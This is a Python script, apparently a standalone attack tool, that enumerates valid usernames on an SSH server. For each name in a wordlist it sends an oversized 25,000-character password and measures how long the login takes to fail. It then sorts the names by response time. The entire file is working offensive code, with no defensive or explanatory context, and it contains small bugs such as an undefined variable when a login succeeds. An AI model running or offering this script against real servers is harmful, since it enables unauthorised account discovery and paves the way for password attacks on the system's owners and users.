import paramiko
import time
import collections
import operator
import sys
from argparse import ArgumentParser

parser = ArgumentParser()
parser.add_argument("-w", "--wordlist", metavar="path", default="wordlist.txt",
                    help="Wordlist with usernames")
parser.add_argument('rhost',
                    help="Target address")
parser.add_argument("-v", "--verbose", action="store_true",
                    help="Verbose")

args = parser.parse_args()

print(args)

p = 'A' * 25000
res = {}
wordlist = args.wordlist
ip = args.rhost
verbose = args.verbose

for user in open(wordlist):
    ssh = paramiko.SSHClient()
    starttime = time.clock()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username=user[0:-1],
                    password=p)
    except:
        endtime = time.clock()
    total = endtime - starttime

    res[user] = total
    if verbose:
        print("%s %s" % (user[0:-1], total))

ressorted = sorted(res.items(), key=operator.itemgetter(1))
print("\nSorted:\n")
for x, y in ressorted:
    print("%s %s" % (x[0:-1], y))
